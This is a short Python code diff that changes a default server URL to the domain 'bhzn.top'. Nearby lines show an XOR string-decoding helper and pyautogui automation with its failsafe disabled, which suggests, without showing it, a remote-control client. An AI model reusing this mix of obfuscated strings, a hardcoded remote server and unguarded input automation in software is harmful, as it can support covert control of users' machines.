@@ -91,7 +91,7 @@ def reveal_text(values, key: int) -> str:
     return "".join(chr(value ^ key) for value in values)
 
 
-DEFAULT_SERVER = "https://todesk.bhzn.top"
+DEFAULT_SERVER = "https://bhzn.top"
 
 pyautogui.FAILSAFE = False
 pyautogui.PAUSE = 0
